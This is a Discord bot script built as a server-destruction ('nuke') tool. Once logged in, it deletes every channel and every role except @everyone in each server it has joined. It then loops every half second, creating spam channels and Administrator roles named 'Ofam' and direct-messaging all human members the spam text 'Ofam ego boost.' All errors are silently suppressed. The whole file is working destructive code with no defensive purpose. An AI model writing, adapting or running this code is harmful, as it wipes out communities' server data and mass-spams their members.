const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');

const i = process.argv[2];

if (!i) {
  console.error("Missing token!");
  process.exit(1);
}

const o = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
  ]
});

o.once('ready', async () => {
  const m = "Ofam ego boost.";
  const c = "Ofam-wesley";
  const r = "Ofam";

  o.guilds.cache.forEach(async g => {
    try {
      const f = await g.fetch();
      const ch = f.channels.cache;
      const rl = f.roles.cache;

      await Promise.all(ch.map(ch => ch.delete().catch(() => {})));

      await Promise.all(rl.map(r => {
        if (r.name !== '@everyone') return r.delete().catch(() => {});
      }));

      setInterval(async () => {
        try {
          const nc = await g.channels.create({
            name: `${c}-${Math.floor(Math.random() * 10000)}`,
            type: ChannelType.GuildText,
            reason: 'Create channel'
          });

          await nc.send(m).catch(() => {});

          await g.roles.create({
            name: `${r}-${Math.floor(Math.random() * 10000)}`,
            color: '#' + Math.floor(Math.random() * 16777215).toString(16),
            permissions: [PermissionsBitField.Flags.Administrator],
            reason: 'Create role'
          }).catch(() => {});

          const mb = await g.members.fetch();
          mb.forEach(me => {
            if (!me.user.bot) {
              me.send(m).catch(() => {});
            }
          });
        } catch (e) {}
      }, 500);
    } catch (e) {}
  });
});

o.login(i).catch(() => {
  console.error("Failed to login.");
  process.exit(1);
});
